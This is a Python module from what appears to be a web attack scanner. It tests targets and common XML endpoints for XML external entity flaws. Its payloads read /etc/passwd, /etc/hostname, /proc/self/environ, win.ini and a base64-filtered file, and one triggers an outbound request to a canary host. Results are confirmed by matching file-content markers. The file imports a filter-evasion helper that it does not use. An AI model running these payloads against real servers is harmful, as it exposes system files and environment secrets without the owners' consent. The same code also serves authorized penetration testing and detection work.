"""xxe v2 — baseline-aware in-band XXE (file-read / SSRF / OOB probes)"""
from core.http import HttpClient
from core.verify import verify, confidence, is_signal
from core.waf_bypass import mutate_until_pass

# канареечный OOB-маркер, который точно не встретится в baseline
OOB_CANARY = "omni-xxe-canary-7x9z.invalid"

# in-band XXE payload'ы — нацелены на /etc/passwd, linux-специфичные
INBAND_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///proc/self/environ">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://' + OOB_CANARY + '/x">%p;]><r>ok</r>',
]

# строгие маркеры — специфичные для содержимого файлов (не общие строки)
MARKERS = [
    "root:x:0:0:root:",       # /etc/passwd полная строка
    "root:x:0:0::/root:",     # /etc/passwd вариант
    "daemon:x:1:1:",          # /etc/passwd daemon
    "[fonts]",                # win.ini
    "[extensions]",           # win.ini
    "for 16-bit app support", # win.ini
    "DOCUMENT_ROOT=/",        # environ apache
    "HTTP_USER_AGENT=",       # environ web
    "PWD=/",                  # environ linux
    "SHLVL=",                 # environ shell
]

# поля XML-форм, которые часто уязвимы
XML_PATHS = [
    "/api/xml", "/api/v1/xml", "/xmlrpc.php", "/soap", "/ws",
    "/api/soap", "/services", "/rest", "/api/parse", "/parse",
]


class Xxe:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        # === baseline: чистый POST с XML — что уже есть в ответе ===
        baseline_text = ""
        try:
            r0 = http.post(target, data="<?xml version='1.0'?><r>baseline</r>",
                          headers={"Content-Type": "application/xml"})
            if r0:
                baseline_text = (r0.text or "").lower()
                print(f"[xxe v2] baseline: {r0.status_code} {len(baseline_text)}b")
        except Exception:
            pass

        # отсеиваем маркеры, которые уже в baseline
        active_markers = [m for m in MARKERS if m.lower() not in baseline_text]
        if not active_markers:
            print("[xxe v2] all markers already in baseline — skip")
            return {"findings": []}

        findings = []
        endpoints = [target] + [target.rstrip("/") + p for p in XML_PATHS]

        for endpoint in endpoints:
            # сначала — проверяем что endpoint принимает XML (200/400 на plain XML)
            try:
                probe = http.post(endpoint, data="<?xml version='1.0'?><r>x</r>",
                                  headers={"Content-Type": "application/xml"})
            except Exception:
                continue
            if not probe or probe.status_code == 404:
                continue

            for payload in INBAND_PAYLOADS:
                try:
                    r = http.post(endpoint, data=payload,
                                  headers={"Content-Type": "application/xml"})
                except Exception:
                    continue
                if not r:
                    continue

                low = (r.text or "").lower()
                hit = None
                for m in active_markers:
                    if m.lower() in low:
                        hit = m
                        break

                # OOB-проверка: если сервер сделал запрос на canary — найдём в ответе
                if not hit and OOB_CANARY in (r.text or ""):
                    hit = f"oob_reflected:{OOB_CANARY}"

                if not hit:
                    continue

                # verify ×2 — маркер должен воспроизвестись
                def rep():
                    try:
                        return http.post(endpoint, data=payload,
                                         headers={"Content-Type": "application/xml"})
                    except Exception:
                        return None

                def predicate(s):
                    low2 = s["body"].lower()
                    return any(m.lower() in low2 for m in active_markers) or OOB_CANARY in s["body"]

                ratio, hits = verify(rep, predicate, n=2, delay=0.2)

                # confidence — высокий если нашли содержимое файла, средний если oob
                if hit.startswith("oob_reflected"):
                    strength, sev = 0.7, "high"
                else:
                    strength, sev = 0.95, "critical"  # содержимое /etc/passwd — сильный сигнал

                conf = confidence(strength, ratio)
                if not is_signal(conf, floor=0.55, module="xxe"):
                    continue

                findings.append({
                    "endpoint": endpoint,
                    "payload": payload[:80],
                    "marker": hit,
                    "verify_hits": hits,
                    "confidence": conf,
                    "severity": sev,
                })
                print(f"  ✓ XXE {sev}: {endpoint} → {hit}")
                logger.finding("xxe", sev,
                               f"{endpoint} marker={hit} conf={int(conf*100)}")
                break  # одного payload'а достаточно на endpoint

        print(f"[xxe v2] findings: {len(findings)}")
        return {"findings": findings}
